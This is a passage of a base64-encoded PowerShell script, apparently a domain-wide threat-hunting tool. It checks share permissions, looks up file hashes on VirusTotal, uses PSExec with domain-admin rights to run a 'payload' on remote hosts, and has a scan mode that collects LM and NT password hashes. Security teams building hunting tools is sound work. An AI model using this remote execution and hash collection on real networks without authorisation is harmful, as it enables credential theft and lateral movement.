IKCVJ1blNjcmlwdEJsb2NrICRMb2dnZWRPblVzZXJzX1NCICRBY3RpdmVDb21wdXRlcnMgJHNjYW4KCVBhcnNlRGF0YSAxMDgKfQoKRnVuY3Rpb24gTmV0d29ya1NoYXJlc1Blcm1pc3Npb25zCnsKCShnZXQtRGF0ZSkuVG9TdHJpbmcoKSB8IFdyaXRlLUhvc3QKCVdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBZZWxsb3cgIkVudW1lcmF0aW5nIG5ldHdvcmstc2hhcmUgcGVybWlzc2lvbnMiCgkKCWlmKFRlc3QtUGF0aCAkT1VUX0RJUikgI2xvb2sgZm9yIG5ldHdvcmsgc2hhcmVzIGRhdGEgaW4gJE9VVF9ESVIKCXsKCQkkTmV0U2hhcmVGaWxlID0gJChnY2kgIiRPVVRfRElSXE5ldHdvcmtTaGFyZXMqLmNzdiIgfHNvcnQgLVByb3BlcnR5IExhc3RXcml0ZVRpbWV8c2VsZWN0IC1maXJzdCAxKQoJCWlmKFRlc3QtUGF0aCAiJE9VVF9ESVJcQ1NWIikKCQl7CgkJCSROZXRTaGFyZUZpbGUxID0gJChnY2kgIiRPVVRfRElSXENTVlxOZXR3b3JrU2hhcmVzKi5jc3YiIHxzb3J0IC1Qcm9wZXJ0eSBMYXN0V3JpdGVUaW1lfHNlbGVjdCAtZmlyc3QgMSkKCQl9Cgl9CgkKCWlmKCROZXRTaGFyZUZpbGUpICNkYXRhIGZvdW5kIGluICRPVVRfRElSCgl7CgkJI0dldCBsaXN0IG9mIHNoYXJlcyBidXQgc2tpcCBjb2x1bW4gbmFtZXMgYW5kICQgc2hhcmVzCgkJJFNoYXJlcyA9IChHZXQtQ29udGVudCAkTmV0U2hhcmVGaWxlfFNlbGVjdCAtc2tpcCAxfFNlbGVjdC1TdHJpbmcgLVNpbXBsZU1hdGNoICckJyAtTm90TWF0Y2gpCgl9CgkKCWVsc2VpZigkTmV0U2hhcmVGaWxlMSkgI2RhdGEgZm91bmQgaW4gJE9VVF9ESVJcQ1NWCgl7CgkJJFNoYXJlcyA9IChHZXQtQ29udGVudCAkTmV0U2hhcmVGaWxlMXxTZWxlY3QgLXNraXAgMXxTZWxlY3QtU3RyaW5nIC1TaW1wbGVNYXRjaCAnJCcgLU5vdE1hdGNoKQoJfQoJCgllbHNle1dyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBSZWQgIk5ldHdvcmstc2hhcmVzIGZpbGUgbm90IGZvdW5kIjsgcmV0dXJufQoKCSNDcmVhdGUgZGF0YSBmaWxlCgkiSG9zdE5hbWUsU2hhcmVOYW1lLElkZW50aXR5LFBlcm1pc3Npb25zLEluaGVyaXRlZCJ8QWRkLUNvbnRlbnQgIiRPVVRfRElSXCRvdXRmaWxlIgoJCglmb3JlYWNoKCRTaGFyZSBpbiAkU2hhcmVzKXsKCQkkSG9zdE5hbWUgPSAkU2hhcmUuVG9TdHJpbmcoKS5zcGxpdCgiLCIpWzBdCgkJJFNoYXJlTmFtZSA9ICRTaGFyZS5Ub1N0cmluZygpLnNwbGl0KCIsIilbMl0KCQlpZihUZXN0LVBhdGggIlxcJEhvc3ROYW1lXCRTaGFyZU5hbWUiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKQoJCXsKCQkJKEdldC1BY2wgIlxcJEhvc3ROYW1lXCRTaGFyZU5hbWUiKS5BY2Nlc3N8JXsKCQkJCSIkSG9zdE5hbWUsIisKCQkJCSJcXCRIb3N0TmFtZVwkU2hhcmVOYW1lLCIrCgkJCQkkXy5JZGVudGl0eVJlZmVyZW5jZS50b3N0cmluZygpKyIsIisKCQkJCSQoJF8uRmlsZVN5c3RlbVJpZ2h0cy50b3N0cmluZygpIC1yZXBsYWNlICcsJywgJzsnKSsiLCIrCgkJCQkkXy5Jc0luaGVyaXRlZC50b3N0cmluZygpfEFkZC1Db250ZW50ICIkT1VUX0RJUlwkb3V0ZmlsZSIKCQkJfQoJCX0KCX0KCUNvbnZlcnRGaWxlRm9ybWF0ICIkT1VUX0RJUlwkb3V0ZmlsZSIKCU1vdmUtSXRlbSAiJE9VVF9ESVJcJG91dGZpbGUiICIkT1VUX0RJUlxDU1ZcJG91dGZpbGUiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCn0KCkZ1bmN0aW9uIFNlbmRSZXF1ZXN0CnsKCXBhcmFtKCRoYXNoQmxvY2ssICRBUElLZXkpCgkKICAgICRwYXIgPSBAewogICAgICAgIFVyaSA9ICdodHRwczovL3d3dy52aXJ1c3RvdGFsLmNvbS92dGFwaS92Mi9maWxlL3JlcG9ydCcKICAgICAgICBEaXNhYmxlS2VlcEFsaXZlID0gJHRydWUKICAgICAgICBNZXRob2QgPSAnUE9TVCcKICAgICAgICBCb2R5ID0gQHthcGlrZXkgPSAiJEFQSUtleSJ9CiAgICB9CgogICAgJHBhclsnQm9keSddLnJlc291cmNlID0gJGhhc2hCbG9jawoKICAgIHRyeSB7CgkJJGRhdGEgPSBJbnZva2UtUmVzdE1ldGhvZCBAcGFyIAoJfSBjYXRjaCB7CgkJV3JpdGUtaG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiVmlydXMgdG90YWwgd2ViIHJlcXVlc3QgZmFpbGVkIgoJCVJldHVybiAkZmFsc2UKCX0KCQogICAgJGRhdGF8JXsKICAgICRfLnJlc291cmNlKyIsIiskXy5wb3NpdGl2ZXMrIiwiKyRfLnRvdGFsKyIsIiskXy5zY2FuX2RhdGUrIiwiKyRfLnBlcm1hbGlua318CiAgICBBZGQtQ29udGVudCAiJFRFTVBfRElSXCRPdXRGaWxlIiAKCVJldHVybiAkdHJ1ZQp9CgpGdW5jdGlvbiBWVEhhc2hBbmFseXNpcwp7CglpZigkUFNWZXJzaW9uVGFibGUuUFNWZXJzaW9uLk1ham9yIC1sdCAzKQoJewoJCVdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBSZWQgIkZ1bmN0aW9uIHJlcXVpcmVzIFBvd2Vyc2hlbGwgdmVyc2lvbiAzLjAgb3IgaGlnaGVyIgoJCVJldHVybgoJfQoJCglXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4gIgpWaXJ1cyBUb3RhbCBIYXNoIEFuYWx5c2lzCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iCgl3aGlsZSgkdHJ1ZSkKCXsKCQlXcml0ZS1Ib3N0ICJFbnRlciBwcm94eSBJUCBbbm9uZV06ICIgLU5vTmV3TGluZQoJCSRwcm94eUlQID0gUmVhZFllbGxvdyAKCQlpZigkcHJveHlJUCkKCQl7CgkJCWlmKFJldHVybkZ1bmN0aW9uICRwcm94eUlQKXtSZXR1cm59CgkJCWlmKFZlcmlmeUlQICRwcm94eUlQKQoJCQl7CgkJCQl3aGlsZSgkdHJ1ZSkKCQkJCXsKCQkJCQlXcml0ZS1Ib3N0ICJFbnRlciBwcm94eSBwb3J0IFs4MDgwXTogIiAtTm9OZXdMaW5lCgkJCQkJJHByb3h5UG9ydCA9IFJlYWRZZWxsb3cgCgkJCQkJaWYoLW5vdCAkcHJveHlQb3J0KXskcHJveHlQb3J0ID0gODA4MH0KCQkJCQllbHNlaWYoUmV0dXJuRnVuY3Rpb24gJHByb3h5UG9ydCl7UmV0dXJufQoJCQkJCWlmKCgkcHJveHlQb3J0IC1sdCA2NTUzNikgLWFuZCAoJHByb3h5UG9ydCAtZ3QgMCkpe2JyZWFrfQoJCQkJCWVsc2UKCQkJCQl7CgkJCQkJCVdyaXRlLUhvc3QgLUZvcmVncm91bmRjb2xvciBSZWQgIkludmFsaWQgUG9ydDogJHByb3h5UG9ydCIKCQkJCQl9CgkJCQl9CgkJCQkkZ2xvYmFsOlBTRGVmYXVsdFBhcmFtZXRlclZhbHVlcyA9IEB7CgkJCQknSW52b2tlLVJlc3RNZXRob2Q6UHJveHknPSdodHRwOi8vJHByb3h5SVA6JHByb3h5UG9ydCcKCQkJCSdJbnZva2UtV2ViUmVxdWVzdDpQcm94eSc9J2h0dHA6Ly8kcHJveHlJUDokcHJveHlQb3J0JwoJCQkJJyo6UHJveHlVc2VEZWZhdWx0Q3JlZGVudGlhbHMnPSR0cnVlCgkJCQl9CgkJCQlicmVhawoJCQl9CgkJCWVsc2UKCQkJewoJCQkJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZGNvbG9yIFJlZCAiSW52YWxpZCBJUDogJHByb3h5SVAiCgkJCX0KCQl9CgkJZWxzZSB7YnJlYWt9Cgl9Cgl3aGlsZSgkdHJ1ZSkKCXsKCQlXcml0ZS1Ib3N0ICJFbnRlciBwYXRoIHRvIGhhc2ggZmlsZTogIiAtTm9OZXdMaW5lCgkJJEhhc2hGaWxlID0gUmVhZFllbGxvdwoJCWlmKCRIYXNoRmlsZSAtYW5kICgtbm90IChUZXN0LVBhdGggJEhhc2hGaWxlKSkpCgkJewoJCQlpZihSZXR1cm5GdW5jdGlvbiAkSGFzaEZpbGUpe1JldHVybn0KCQkJZWxzZQoJCQl7CgkJCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kY29sb3IgUmVkICJGaWxlIG5vdCBmb3VuZDogJEhhc2hGaWxlIgoJCQl9CgkJfQoJCWVsc2VpZigtbm90ICRIYXNoRmlsZSkKCQl7CgkJCVdyaXRlLUhvc3QgLUZvcmVncm91bmRjb2xvciBSZWQgIkhhc2ggZmlsZSBjYW5ub3QgYmUgbnVsbCIKCQl9CgkJZWxzZXticmVha30KCX0KCXdoaWxlKCR0cnVlKQoJewoJCVdyaXRlLUhvc3QgIkVudGVyIEFQSSBrZXk6ICIgLU5vTmV3TGluZQoJCSRBUElLZXkgPSBSZWFkWWVsbG93CgkJaWYoLW5vdCAkQVBJS2V5KQoJCXsKCQkJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZGNvbG9yIFJlZCAiQVBJIGtleSByZXF1aXJlZCEiCgkJfQoJCWlmKFJldHVybkZ1bmN0aW9uICRBUElLZXkpe1JldHVybn0KCQllbHNle2JyZWFrfQoJfQoJV3JpdGUtSG9zdCAiRXhlY3V0ZT8gW1kvbl06ICIgLU5vTmV3TGluZQoJJEV4ZWN1dGUgPSBSZWFkWWVsbG93CglpZigoJEV4ZWN1dGUgLWVxICJuIikgLW9yICgkRXhlY3V0ZSAtZXEgIk4iKSl7UmV0dXJufQoJCglpZigtbm90IChUZXN0LUNvbm5lY3Rpb24gd3d3LnZpcnVzdG90YWwuY29tIC1RdWlldCkpCgl7CgkJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiQ2Fubm90IHJlYWNoIHd3dy52aXJ1c3RvdGFsLmNvbSIKCQlSZXR1cm4KCX0KCQoJV3JpdGUtSG9zdAoJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFllbGxvdyAiRXhlY3V0aW5nIFZpcnVzLVRvdGFsIGhhc2ggYW5hbHlzaXMiCgkkc2NyaXB0Om91dGZpbGUgPSAiVlRfSGFzaEFuYWx5c2lzJCgoZ2V0LWRhdGUpLnRvc3RyaW5nKCJISG1tc3MiKSkuY3N2IgoJIkZpbGUgSGFzaCxIaXRzLCMgb2YgQVZzLEFuYWx5c2lzIERhdGUsVVJMIiB8IEFkZC1Db250ZW50ICIkVEVNUF9ESVJcJG91dGZpbGUiCgkKCSRwcm9nUGFyYW09QHsKCQlBY3Rpdml0eSA9ICJWaXJ1cy1Ub3RhbCBoYXNoIGFuYWx5c2lzIgoJCUN1cnJlbnRPcGVyYXRpb24gPSAiIgoJCVN0YXR1cz0iUGFyc2luZyBoYXNoIGZpbGUiCgkJUGVyY2VudENvbXBsZXRlPTAKCX0KCQoJV3JpdGUtUHJvZ3Jlc3MgQHByb2dQYXJhbQoJCgkkcmVnZXggPSAnXGJbMC05YS1mQS1GXXszMn1cYicKCSRoYXNoZXMgPSBzZWxlY3Qtc3RyaW5nIC1QYXRoICRIYXNoRmlsZSAtUGF0dGVybiAkcmVnZXggLUFsbE1hdGNoZXMgfCAlIHsgJF8uTWF0Y2hlcyB9IHwgJSB7ICRfLlZhbHVlLnRvc3RyaW5nKCkgfQoJJGhhc2hlcyA9ICgkaGFzaGVzfFNvcnQtT2JqZWN0IC1VbmlxdWUpIAoJJGhhc2hCbG9jayA9ICIiCglmb3IoJGM9MDsgJGMgLWxlICRoYXNoZXMuY291bnQ7ICRjKz0gMjUpCgl7CgkJaWYgKCgkaGFzaGVzLmNvdW50IC0gJGMpIC1sdCAyNSkKCQl7CgkJCSRCbG9ja1NpemUgPSAkaGFzaGVzLmNvdW50IC0gJGMKCQl9CgkJZWxzZSB7JEJsb2NrU2l6ZSA9IDI0fQoJCSRGaXJzdD0kdHJ1ZQoJCSRoYXNoZXNbKCRjLi4oJGMrJEJsb2NrU2l6ZSkpXSB8ICUgewoJCQlpZigkRmlyc3QpeyRoYXNoQmxvY2s9JF87ICRGaXJzdD0kZmFsc2V9CgkJCWVsc2V7JGhhc2hCbG9jayA9ICRoYXNoQmxvY2srIiwgIiskX30gCgkJfQoJCSRSZXF1ZXN0U3RhdHVzID0gU2VuZFJlcXVlc3QgJGhhc2hCbG9jayAkQVBJS2V5CgkJaWYoLW5vdCAkUmVxdWVzdFN0YXR1cyl7UmV0dXJufQoJCQoJCVtpbnRdJHBjdCA9ICgkYy8kaGFzaGVzLmNvdW50KSoxMDAgCgkJJHByb2dQYXJhbS5DdXJyZW50T3BlcmF0aW9uID0iJGMvJCgkaGFzaGVzLmNvdW50KSBoYXNoZXMgcHJvY2Vzc2VkIgoJCSRwcm9nUGFyYW0uU3RhdHVzPSJQcm9ncmVzcyIKCQkkcHJvZ1BhcmFtLlBlcmNlbnRDb21wbGV0ZSA9ICRwY3QKCQlXcml0ZS1Qcm9ncmVzcyBAcHJvZ1BhcmFtIAoJCQoJCWlmKCRjIC1lcSAkaGFzaGVzLmNvdW50KXtSZXR1cm59CgkJc2xlZXAgMTUKCX0KCUNvbnZlcnRGaWxlRm9ybWF0ICIkVEVNUF9ESVJcJG91dGZpbGUiIAp9CgojUnVuIHRoZSBTY2FuCkZ1bmN0aW9uIEV4ZWN1dGUgCnsKCWlmICgtbm90ICRzY3JpcHQ6T1VUX0RJUil7JENvbmZpZ1N1Y2Nlc3MgPSBjb25maWd9ICNzY2FuIHZhcnMgaGF2ZSBub3QgYmVlbiBjb25maWd1cmVkIGVudGVyIGNvbmZpZ3VyYXRpb24gbW9kZQoJZWxzZXskQ29uZmlnU3VjY2VzcyA9ICR0cnVlfQoJaWYoLW5vdCAkQ29uZmlnU3VjY2Vzcyl7UmV0dXJufQoJCglpZigkc2NyaXB0OkNvbXBzRGF0ZSl7CgkJI3JlZnJlc2ggbGlzdCBvZiBhY3RpdmUgY29tcHV0ZXJzIGFmdGVyIDMgaG91cnMKCQlpZigkc2NyaXB0OkNvbXBzRGF0ZSAtbHQgKEdldC1EYXRlKS5BZGRIb3VycygtMykpeyRzY3JpcHQ6Rmlyc3RSdW5Db21wcz0kdHJ1ZX0KCX0KCQoJaWYoLW5vdCAoJFNjYW5Ib3N0c0ZpbGUgLWVxICJBTEwiKSkKCXsKCQkkTW9kVGltZSA9IChnY2kgJFNjYW5Ib3N0c0ZpbGUpLkxhc3RXcml0ZVRpbWUKCQlpZiAoJEhvc3RGaWxlTW9kVGltZSAtbHQgJE1vZFRpbWUpCgkJewoJCQkkc2NyaXB0Okhvc3RGaWxlTW9kVGltZSA9ICRNb2RUaW1lCgkJCSRzY3JpcHQ6Rmlyc3RSdW5Db21wcz0kdHJ1ZQoJCX0KCX0KCgkjTWFrZSBkYXRhIGRpcmVjdG9yeSBpZiBpdCBpcyBub3QgcHJlc2VudAoJaWYgKChUZXN0LVBhdGggJHNjcmlwdDpPVVRfRElSKSAtZXEgJGZhbHNlKQoJewoJCW1rZGlyIC1QYXRoICRzY3JpcHQ6T1VUX0RJUiAtRm9yY2UgfCBPdXQtTnVsbAoJfQoJCglDcmVhdGVUZW1wRGlyCglEaXNwbGF5TWVudSAKCQoJI2NvbnRpbnVlIGxvb3BpbmcgdW50aWwgYWxsIHNjYW5zIGNvbXBsZXRlZAoJZm9yKCRpPTA7ICRpIC1sdCAkc2NyaXB0OlNjYW5DaG9pY2VBcnJheS5jb3VudDsgJGkrKykKCXsKCQlpZiAoLW5vdCAoU2V0U2NhblR5cGVWYXJzICRzY3JpcHQ6U2NhbkNob2ljZUFycmF5WyRpXSkpe2NvbnRpbnVlfSAjc2NhbiBjaG9pY2Ugd2FzIGludmFsaWQuIE1vdmUgdG8gbmV4dAoJCQoJCWlmKCRzY3JpcHQ6RGVwbG95KQoJCXsJCQoJCQkKCQkJaWYoLW5vdCAkc2NyaXB0OkFkbWluUHJpdnMpICNhZG1pbiBwcml2cyBhcmUgcmVxdWlyZWQgZm9yIHBzZXhlYwoJCQl7CgkJCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgUmVkICJEb21haW4gQWRtaW4gcHJpdmlsZWdlcyByZXF1aXJlZCB0byBleGVjdXRlIFNjYW5UeXBlIgoJCQkJI2NvbnRpbnVlCgkJCX0KCQkJCgkJCWlmKCRzY3JpcHQ6Rmlyc3RSdW5Db21wcykgI1Rlc3QgdG8gc2VlIGlmIGxpc3Qgb2YgYWN0aXZlIGNvbXB1dGVycyBleGlzdHMgb3Igbm90CgkJCXsKCQkJCWlmKC1ub3QgKFRlc3QtUGF0aCAkVEVNUF9ESVIpKXtDcmVhdGVUZW1wRGlyfQoJCQkJJHNjcmlwdDpBY3RpdmVDb21wdXRlcnMgPSBHZXRBY3RpdmVDb21wdXRlcnMgCgkJCX0KCQkKCQkJQ3JlYXRlVGVtcERpcgoJCQoJCQkoZ2V0LURhdGUpLlRvU3RyaW5nKCkKCQkJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFllbGxvdyAiUGVyZm9ybWluZyAkU2NhblR5cGUiCgkJCQoJCQkkc2NyaXB0OkNsZWFuVXAgPSAkdHJ1ZQoJCQkKCQkJI0NyZWF0ZSBlcnJvciBsb2cuICBUaGlzIGNvdWxkIGJlIGNyZWF0ZWQgZHluYW1pY2FsbHkgd2hlbiBhbiBlcnJvciBvY2N1cnMgYnkgd3JpdGluZyBhIEZ1bmN0aW9uIGFuZCAKCQkJI1N0b3JpbmcgaXQgaW4gdGhlICRzY2FuIGhhc2gtdGFibGUgdG8gYmUgYWNjZXNzaWJsZSBieSBzY3JpcHQgYmxvY2tzIGJ1dCB0aGlzIHdhcyBlYXNpZXIgYXQgdGhlIG1vbWVudC4KCQkJIlRpbWUgU3RhbXAsSG9zdCBOYW1lLCBFcnJvciIgfCBBZGQtQ29udGVudCAiJFRFTVBfRElSXEVycm9yTG9nLmNzdiIgCgkJCQoJCQlFeGVjdXRlUFNleGVjCgkJCUNvbGxlY3RGaWxlcwoKCQkJaWYoJHNjYW4uUmVtb3RlRGF0YUZpbGUgLWVxICJoYXNoZXMzOTIxMjUyODEiKQoJCQl7CgkJCQkkc2Nhbi5EYXRhfG91dC1maWxlICIkKCRzY2FuLlRFTVBfRElSKVxvdXRwdXQudHh0IgoJCQkJJHNjYW4uRGF0YSA9ICRudWxsCgkJCX0KCQkJUGFyc2VEYXRhICRzY3JpcHQ6U2NhbkNob2ljZUFycmF5WyRpXQoJCX0KCX0KCWlmKCRzY3JpcHQ6Q2xlYW5VcCkKCXsKCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93ICJDbGVhbmluZyBVcC4uLiIKCQlSdW5TY3JpcHRCbG9jayAkQ2xlYW5VcFNCICRBY3RpdmVDb21wdXRlcnMgJHNjYW4KCQkkc2NyaXB0OkNsZWFuVXAgPSAkZmFsc2UKCX0KCglXcml0ZS1Ib3N0Cn0KCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMJCUVORAlTY2FuIEZ1bmN0aW9ucwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyAKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIFNUQVJUIEZ1bmN0aW9ucyBmb3IgRGVwbG95L011bHRpLXRocmVhZGluZwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyAKCkZ1bmN0aW9uIFJ1blNjcmlwdEJsb2NrICNDcmVhdGUgbXVsdGlwbGUgdGhyZWFkcyB0byBkbyB3b3JrCnsKICAgIHBhcmFtKCRTY3JpcHRCbG9jaywgJFJlbW90ZUhvc3RzLCAkc2NhbikgI0Z1bmN0aW9uIHBhcmFtZXRlcnMKCgkjY3JlYXRlIHJ1biBzcGFjZSBwb29sLiAgVGhyb3R0bGUgaXMgbWF4IG51bWJlciBvZiB0aHJlYWRzIHRvIGV4ZWN1dGUgYXQgb25jZQogICAgJFJ1bnNwYWNlUG9vbCA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZVBvb2woMSwgJHNjYW4uVGhyb3R0bGUpCiAgICAkUnVuc3BhY2VQb29sLk9wZW4oKQogICAgJEpvYnMgPSBAKCkKCQoJI2l0ZXJhdGUgdGhyb3VnaCBob3N0cyBhbmQgc3RhcnQgbmV3IHBvd2Vyc2hlbGwgam9iIGZvciBlYWNoIGhvc3QKICAgICRSZW1vdGVIb3N0cyB8ICUgewoJCQoJCSNhZGQgdGhlIHNjcmlwdGJsb2NrIGFuZCBwYXJhbWV0ZXJzCiAgICAgICAgJEpvYiA9IFtwb3dlcnNoZWxsXTo6Q3JlYXRlKCkuQWRkU2NyaXB0KCRTY3JpcHRCbG9jaykuQWRkQXJndW1lbnQoJF8pLkFkZEFyZ3VtZW50KCRzY2FuKQogICAgICAgICRKb2IuUnVuc3BhY2VQb29sID0gJFJ1bnNwYWNlUG9vbAogICAgICAgCiAgICAgICAgJEpvYnMgKz0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAgICAgUnVuTnVtID0gJF8KICAgICAgICAgICAgUGlwZSA9ICRKb2IKICAgICAgICAgICAgUmVzdWx0ID0gJEpvYi5CZWdpbkludm9rZSgpCiAgICAgICAgfQogICAgfQogICAgCgkjZ2V0IHJlc3VsdHMKICAgICRSZXN1bHRzID0gQCgpCiAgICBGb3JFYWNoICgkSm9iIGluICRKb2JzKQogICAgeyAgIAogICAgICAgICRSZXN1bHRzICs9ICRKb2IuUGlwZS5FbmRJbnZva2UoJEpvYi5SZXN1bHQpCiAgICB9CgkKICAgICRSZXN1bHRzIAogICAgJFJ1bnNwYWNlUG9vbC5EaXNwb3NlKCkKfQoKRnVuY3Rpb24gRXhlY3V0ZVBTZXhlYyAjQ29weSBhbmQgZXhlY3V0ZSBkZXBsb3lhYmxlIHBheWxvYWQKewoJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFllbGxvdyAiRXhlY3V0aW5nIHBheWxvYWQgb24gcmVtb3RlIGhvc3RzIgoJJFBTZXhlY0pvYiA9IFN0YXJ0LUpvYiAtU2NyaXB0QmxvY2sgJFBTZXhlY1dhdGNoZXIKCSRTY3JpcHQ6Q29sbGVjdENvbXB1dGVycyA9IFJ1blNjcmlwdEJsb2NrICRQU0V4ZWNfU0IgJEFjdGl2ZUNvbXB1dGVycyAkc2NhbgoJU3RvcC1Kb2IgJFBTZXhlY0pvYgoJUmVtb3ZlLUpvYiAkUFNleGVjSm9iCn0KCkZ1bmN0aW9uIENvbGxlY3RGaWxlcyAjQ29sbGVjdCByZXN1bHRzIGZyb20gcmVtb3RlIGhvc3RzCnsKCVdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBZZWxsb3cgIkNvbGxlY3RpbmcgZmlsZXMgZnJvbSByZW1vdGUgaG9zdHMiCglSdW5TY3JpcHRCbG9jayAkQ29sbGVjdEZpbGVzX1NCICRDb2xsZWN0Q29tcHV0ZXJzICRzY2FuCn0KCkZ1bmN0aW9uIFBhcnNlRGF0YSAjQnVpbGQgY29tcGlsZSByZXN1bHRzIGludG8gYSBzaW5nbGUgY3N2IGZpbGUKewoJcGFyYW0oJFNjYW5DaG9pY2UpCglXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93ICJQYXJzaW5nIGNvbGxlY3RlZCBkYXRhIgoJCgkjc2V0IHZhcmlhYmxlcyBmb3IgZGlmZmVyZW50IGdlbmVyYXRlZCBmaWxlcwoJJFJlc3VsdHMgPSAiJFRFTVBfRElSXCRPdXRGaWxlIgoJJFJlc3VsdHNVbmlxdWUgPSAiJFRFTVBfRElSXFVuaXF1ZS5jc3YiCgkkUmVzdWx0c0ZpbHRlcmVkID0gIiRURU1QX0RJUlxGaWx0ZXJlZC5jc3YiCQoJJFJlc3VsdHNVbmlxRmlsdCA9ICIkVEVNUF9ESVJcRmlsdGVyZWRfVW5pcXVlLmNzdiIKCSRFcnJvcnMgPSAiJFRFTVBfRElSXEVycm9yTG9nLmNzdiIKCgkjQWRkIGNvbHVtbiBoZWFkZXJzIHRvIGZpbGVzCiAgICBzd2l0Y2ggKCRTY2FuQ2hvaWNlKSAKICAgIHsKCQkxeyJIb3N0IE5hbWUsRXhlY3V0YWJsZSxQYXRoIiB8QWRkLUNvbnRlbnQgJFJlc3VsdHN9CgkJMnsiSG9zdCBOYW1lLERlc2NyaXB0aW9uLEZyaWVuZGx5IE5hbWUsTG9jYXRpb24ifEFkZC1Db250ZW50ICRSZXN1bHRzfQoJCTN7Ikhvc3QgTmFtZSwgRGlzYWJsZWQifEFkZC1Db250ZW50ICRSZXN1bHRzfQogICAgICAgIDR7Ikhvc3QgTmFtZSxDb21tYW5kLERlc2NyaXB0aW9uLExvY2F0aW9uLFVzZXIifEFkZC1Db250ZW50ICRSZXN1bHRzfQogICAgICAgIDV7Ikhvc3QgTmFtZSxDb21tYW5kLEpvYklkLE5hbWUsT3duZXIsUHJpb3JpdHkifEFkZC1Db250ZW50ICRSZXN1bHRzfQoJCTZ7Ikhvc3QgTmFtZSxFeGVjdXRhYmxlIFBhdGgsTmFtZSIgfEFkZC1Db250ZW50ICRSZXN1bHRzfQogICAgICAgIDd7Ikhvc3QgTmFtZSxEZXNjcmlwdGlvbixEaXNwbGF5TmFtZSxOYW1lLFN0YXJ0ZWQsU3RhdGUsU3RhdHVzIiB8QWRkLUNvbnRlbnQgJFJlc3VsdHN9CiAgICAgICAgOHsiSG9zdCBOYW1lLE5hbWUsU3RhcnRNb2RlLFN0YXRlLFN0YXR1cyIgfEFkZC1Db250ZW50ICRSZXN1bHRzfQogICAgICAgIDl7Ikhvc3QgTmFtZSxTb3VyY2UgSVAsU291cmNlIFBvcnQsRGVzdGluYXRpb24gSVAsRGVzdGluYXRpb24gUG9ydCxTdGF0ZSxQcm9jZXNzIE5hbWUsUHJvY2VzcyBJRCJ8QWRkLUNvbnRlbnQgJFJlc3VsdHN9CgkJMTB7Ikhvc3QgTmFtZSxJbnN0YWxsRGF0ZSxJbnN0YWxsTG9jYXRpb24sTmFtZSxWZW5kb3IsVmVyc2lvbiIgfEFkZC1Db250ZW50ICRSZXN1bHRzfQogICAgICAgIDExeyJIb3N0IE5hbWUsRGVzY3JpcHRpb24sTmFtZSxQYXRoIiB8QWRkLUNvbnRlbnQgJFJlc3VsdHN9IAoJCTEzeyJIb3N0IE5hbWUsRGlzcGxheSBOYW1lLEVuYWJsZWQsVXB0b0RhdGUsVmVyc2lvbiJ8QWRkLUNvbnRlbnQgJFJlc3VsdHN9CgkJMTR7Ikhvc3QgTmFtZSxBY2NvdW50IE5hbWUsQWNjb3VudCBBY3RpdmUsTGFzdCBMb2dvbiJ8QWRkLUNvbnRlbnQgJFJlc3VsdHN9CgkJMTZ7Ikhvc3QgTmFtZSxEZXNjcmlwdGlvbixIb3RGaXhJRCxJbnN0YWxsZWRCeSxJbnN0YWxsZWRPbiIgfEFkZC1Db250ZW50ICRSZXN1bHRzfQoJCTEwMXsiSG9zdCBOYW1lLEZpbGUgTmFtZSxQYXRoIiB8QWRkLUNvbnRlbnQgJFJlc3VsdHN9CgkJMTAyeyJIb3N0IE5hbWUsRmlsZSBOYW1lLFBhdGgiIHxBZGQtQ29udGVudCAkUmVzdWx0c30KCQkxMDN7Ikhvc3QgTmFtZSxGaWxlIE5hbWUsUGF0aCIgfEFkZC1Db250ZW50ICRSZXN1bHRzfQoJCTEwNHsiSG9zdCBOYW1lLEZpbGUgTmFtZSxQYXRoIiB8QWRkLUNvbnRlbnQgJFJlc3VsdHN9CgkJMTA1eyJIb3N0IE5hbWUsRmlsZSBOYW1lLFBhdGgiIHxBZGQtQ29udGVudCAkUmVzdWx0c30KCQkxMDZ7Ikhvc3QgTmFtZSxGaWxlIE5hbWUsUGF0aCIgfEFkZC1Db250ZW50ICRSZXN1bHRzfQoJCTEwN3siSG9zdCBOYW1lLEZpbGUgTmFtZSxQYXRoIiB8QWRkLUNvbnRlbnQgJFJlc3VsdHN9CgkJMTA4eyJIb3N0IE5hbWUsVXNlciJ8QWRkLUNvbnRlbnQgJFJlc3VsdHN9CgkJMTA5eyJJUCBBZGRyZXNzLFRUTCJ8QWRkLUNvbnRlbnQgJFJlc3VsdHN9CgkJMTEweyJIb3N0IE5hbWUsVXNlcixSSUQsTE0gSGFzaCxOVCBIYXNoInxBZGQtQ29udGVudCAkUmVzdWx0c30KCQkxMTF7IkZpbGUgTmFtZSxNRDUgSGFzaCJ8QWRkLUNvbnRlbnQgJFJlc3VsdHN9Cgl9CiAgICAKCSNBcHB